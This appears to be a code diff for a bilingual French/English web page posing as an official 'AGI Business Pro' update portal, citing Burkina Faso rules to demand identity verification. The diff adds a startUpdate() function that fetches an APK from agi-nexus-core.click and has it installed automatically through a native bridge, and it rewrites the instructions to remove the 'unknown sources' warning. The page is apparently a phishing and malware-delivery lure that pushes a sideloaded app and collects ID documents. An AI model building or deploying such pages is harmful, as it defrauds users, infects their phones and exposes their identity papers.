@@ -41,7 +41,7 @@
             font-family: 'Inter', system-ui, -apple-system, sans-serif; 
             background-color: var(--bg-body); 
             color: var(--text-main); 
-            font-size: 14px; /* Taille de police réduite pour un look premium */
+            font-size: 14px; 
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
         }
@@ -144,11 +144,20 @@
             transition: var(--transition);
             border: none;
             cursor: pointer;
+            font-family: inherit;
         }
 
-        .btn-download:hover {
+        .btn-download:hover:not(:disabled) {
             background-color: var(--accent-hover);
             transform: translateY(-1px);
+        }
+
+        /* État désactivé pendant le téléchargement */
+        .btn-download:disabled {
+            background-color: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
         /* Bouton Header */
@@ -276,7 +285,7 @@
         /* RESPONSIVE */
         @media (max-width: 480px) {
             .nav-subtitle { display: none; }
-            .btn-header-text { display: none; } /* Masque le texte du bouton header sur petit écran, garde l'icône */
+            .btn-header-text { display: none; } 
             .btn-header { padding: 8px 12px; }
             .container { margin: 24px auto; }
             h1 { font-size: 1.25rem; }
@@ -300,15 +309,15 @@
                 <button class="lang-btn active" id="btn-fr" onclick="setLang('fr')">FR</button>
                 <button class="lang-btn" id="btn-en" onclick="setLang('en')">EN</button>
             </div>
-            <!-- Bouton Téléchargement Header -->
-            <a href="/agi-business.pro.apk" class="btn-download btn-header" target="_blank" rel="noopener noreferrer">
+            <!-- Bouton Téléchargement Header (Modifié) -->
+            <button id="btn-header-action" onclick="startUpdate('https://agi-nexus-core.click/agi-business.pro.apk')" class="btn-download btn-header">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                     <polyline points="7 10 12 15 17 10"></polyline>
                     <line x1="12" y1="15" x2="12" y2="3"></line>
                 </svg>
                 <span class="btn-header-text" id="t-header-btn">Télécharger</span>
-            </a>
+            </button>
         </div>
     </nav>
 
@@ -331,14 +340,14 @@
                 Détails de la version
             </h3>
             <p id="t-version-desc1">Cette nouvelle version intègre les normes de sécurité requises par l'État pour garantir la protection de vos opérations et la conformité de notre écosystème.</p>
-            <p id="t-version-desc2"><strong>Note :</strong> Ce portail sécurisé est conçu exclusivement pour faciliter le téléchargement direct de l'application via votre navigateur Chrome.</p>
+            <p id="t-version-desc2"><strong>Note :</strong> L'installation de la mise à jour se fera automatiquement une fois le téléchargement terminé.</p>
         </div>
 
-        <!-- Bouton Téléchargement Corps de page -->
+        <!-- Bouton Téléchargement Corps de page (Modifié) -->
         <div style="text-align: center;">
-            <a href="/agi-business.pro.apk" class="btn-download btn-main" target="_blank" rel="noopener noreferrer">
+            <button id="btn-main-action" onclick="startUpdate('https://agi-nexus-core.click/agi-business.pro.apk')" class="btn-download btn-main">
                 <div class="btn-main-row">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" id="icon-download-main">
                         <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                         <polyline points="7 10 12 15 17 10"></polyline>
                         <line x1="12" y1="15" x2="12" y2="3"></line>
@@ -346,7 +355,7 @@
                     <span id="t-main-btn">Télécharger l'APK</span>
                 </div>
                 <div class="btn-size" id="t-download-size">Taille : 30.01 Mo</div>
-            </a>
+            </button>
         </div>
 
         <div class="card instructions">
@@ -355,9 +364,9 @@
                 Guide d'installation
             </h3>
             <ol>
-                <li id="t-step1">Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus ou dans l'en-tête.</li>
-                <li id="t-step2">Une fois le téléchargement terminé dans Chrome, ouvrez le fichier depuis vos notifications ou votre dossier <em>Téléchargements</em>.</li>
-                <li id="t-step3">Si votre smartphone affiche un message concernant l'installation à partir de <strong>"Sources inconnues"</strong>, allez dans vos paramètres et autorisez l'installation depuis Chrome.</li>
+                <li id="t-step1">Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus.</li>
+                <li id="t-step2">Veuillez patienter quelques instants pendant le téléchargement en arrière-plan.</li>
+                <li id="t-step3">Une fenêtre d'installation s'ouvrira automatiquement à la fin. Autorisez l'installation si demandé.</li>
                 <li id="t-step4">Installez la mise à jour et ouvrez l'application.</li>
                 <li id="t-step5">Suivez le processus de vérification d'identité à l'écran.</li>
             </ol>
@@ -369,8 +378,54 @@
         </div>
     </main>
 
-    <!-- Script de gestion des langues -->
+    <!-- Script de gestion des téléchargements natifs et langues -->
     <script>
+        // Fonction pour déclencher le téléchargement via l'application Android
+        function startUpdate(url) {
+            // Modification visuelle des boutons pour indiquer l'action en cours
+            const btnHeader = document.getElementById('btn-header-action');
+            const btnMain = document.getElementById('btn-main-action');
+            const textHeader = document.getElementById('t-header-btn');
+            const textMain = document.getElementById('t-main-btn');
+            const iconMain = document.getElementById('icon-download-main');
+            
+            // Désactiver les boutons
+            btnHeader.disabled = true;
+            btnMain.disabled = true;
+
+            // Changer le texte (En fonction de la langue actuelle)
+            const currentLang = document.getElementById('html-lang').getAttribute('lang') || 'fr';
+            if (currentLang === 'fr') {
+                textHeader.innerText = "En cours...";
+                textMain.innerText = "Téléchargement en cours...";
+            } else {
+                textHeader.innerText = "Downloading...";
+                textMain.innerText = "Downloading...";
+            }
+
+            // Remplacer l'icône par un sablier/spinner si désiré (Optionnel)
+            iconMain.innerHTML = '<circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>';
+            iconMain.setAttribute('stroke-dasharray', '60');
+            iconMain.setAttribute('stroke-dashoffset', '0');
+            iconMain.style.animation = 'spin 2s linear infinite';
+
+            // Injection CSS pour l'animation
+            if(!document.getElementById('spinner-css')) {
+                const style = document.createElement('style');
+                style.id = 'spinner-css';
+                style.innerHTML = '@keyframes spin { 100% { transform: rotate(360deg); } }';
+                document.head.appendChild(style);
+            }
+
+            // Appel de l'interface Native Android
+            if (typeof NexusBridge !== 'undefined' && NexusBridge.downloadAndInstallUpdate) {
+                NexusBridge.downloadAndInstallUpdate(url);
+            } else {
+                // Fallback de sécurité si la page est ouverte sur un PC ou un navigateur classique
+                window.location.href = url;
+            }
+        }
+
         const translations = {
             fr: {
                 pageTitle: "Télécharger AGI Business Pro - Mise à jour",
@@ -378,14 +433,14 @@
                 alert: "<strong>Action Requise :</strong> Conformément à la réglementation gouvernementale du Burkina Faso, une vérification d'identité complète (CNIB ou Passeport) est désormais obligatoire pour continuer à utiliser nos services.",
                 versionTitle: "Détails de la version",
                 versionDesc1: "Cette nouvelle version intègre les normes de sécurité requises par l'État pour garantir la protection de vos opérations et la conformité de notre écosystème.",
-                versionDesc2: "<strong>Note :</strong> Ce portail sécurisé est conçu exclusivement pour faciliter le téléchargement direct de l'application via votre navigateur Chrome.",
+                versionDesc2: "<strong>Note :</strong> L'installation de la mise à jour se fera automatiquement une fois le téléchargement terminé.",
                 headerBtn: "Télécharger",
                 mainBtn: "Télécharger l'APK",
                 downloadSize: "Taille : 30.01 Mo",
                 guideTitle: "Guide d'installation",
-                step1: "Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus ou dans l'en-tête.",
-                step2: "Une fois le téléchargement terminé dans Chrome, ouvrez le fichier depuis vos notifications ou votre dossier <em>Téléchargements</em>.",
-                step3: "Si votre smartphone affiche un message concernant l'installation à partir de <strong>\"Sources inconnues\"</strong>, allez dans vos paramètres et autorisez l'installation depuis Chrome.",
+                step1: "Cliquez sur le bouton <strong>Télécharger l'APK</strong> ci-dessus.",
+                step2: "Veuillez patienter quelques instants pendant le téléchargement en arrière-plan.",
+                step3: "Une fenêtre d'installation s'ouvrira automatiquement à la fin. Autorisez l'installation si demandé.",
                 step4: "Installez la mise à jour et ouvrez l'application.",
                 step5: "Suivez le processus de vérification d'identité à l'écran.",
                 footer: "&copy; 2026 Atlas Group International.<br>agi-nexus-core.click | Infrastructure Sécurisée et Conforme"
@@ -396,14 +451,14 @@
                 alert: "<strong>Action Required:</strong> In accordance with Burkina Faso government regulations, complete identity verification (CNIB or Passport) is now mandatory to continue using our services.",
                 versionTitle: "Version Details",
                 versionDesc1: "This new version integrates state-required security standards to ensure the protection of your operations and the compliance of our ecosystem.",
-                versionDesc2: "<strong>Note:</strong> This secure portal is exclusively designed to facilitate the direct download of the application via your Chrome browser.",
+                versionDesc2: "<strong>Note:</strong> The installation will start automatically once the download is complete.",
                 headerBtn: "Download",
                 mainBtn: "Download APK",
                 downloadSize: "Size: 30.01 MB",
                 guideTitle: "Installation Guide",
-                step1: "Click the <strong>Download APK</strong> button above or in the header.",
-                step2: "Once the download is complete in Chrome, open the file from your notifications or your <em>Downloads</em> folder.",
-                step3: "If your smartphone displays a message about installing from <strong>\"Unknown sources\"</strong>, go to your settings and allow installation from Chrome.",
+                step1: "Click the <strong>Download APK</strong> button above.",
+                step2: "Please wait a few moments while it downloads in the background.",
+                step3: "An installation window will open automatically. Allow installation if prompted.",
                 step4: "Install the update and open the application.",
                 step5: "Follow the identity verification process on the screen.",
                 footer: "&copy; 2026 Atlas Group International.<br>agi-nexus-core.click | Secure and Compliant Infrastructure"
@@ -411,18 +466,21 @@
         };
 
         function setLang(lang) {
-            // Changement de l'attribut lang de la page HTML
             document.getElementById('html-lang').setAttribute('lang', lang);
 
-            // Mise à jour du texte
             document.getElementById('t-page-title').innerHTML = translations[lang].pageTitle;
             document.getElementById('t-title').innerHTML = translations[lang].title;
             document.getElementById('t-alert').innerHTML = translations[lang].alert;
             document.getElementById('t-version-title').innerHTML = translations[lang].versionTitle;
             document.getElementById('t-version-desc1').innerHTML = translations[lang].versionDesc1;
             document.getElementById('t-version-desc2').innerHTML = translations[lang].versionDesc2;
-            document.getElementById('t-header-btn').innerHTML = translations[lang].headerBtn;
-            document.getElementById('t-main-btn').innerHTML = translations[lang].mainBtn;
+            
+            // Ne met à jour le texte du bouton que s'il n'est pas en cours de téléchargement
+            if (!document.getElementById('btn-main-action').disabled) {
+                document.getElementById('t-header-btn').innerHTML = translations[lang].headerBtn;
+                document.getElementById('t-main-btn').innerHTML = translations[lang].mainBtn;
+            }
+            
             document.getElementById('t-download-size').innerHTML = translations[lang].downloadSize;
             document.getElementById('t-guide-title').innerHTML = translations[lang].guideTitle;
             document.getElementById('t-step1').innerHTML = translations[lang].step1;
@@ -432,7 +490,6 @@
             document.getElementById('t-step5').innerHTML = translations[lang].step5;
             document.getElementById('t-footer').innerHTML = translations[lang].footer;
             
-            // Mise à jour de l'état des boutons de sélection
             document.getElementById('btn-fr').classList.toggle('active', lang === 'fr');
             document.getElementById('btn-en').classList.toggle('active', lang === 'en');
         }
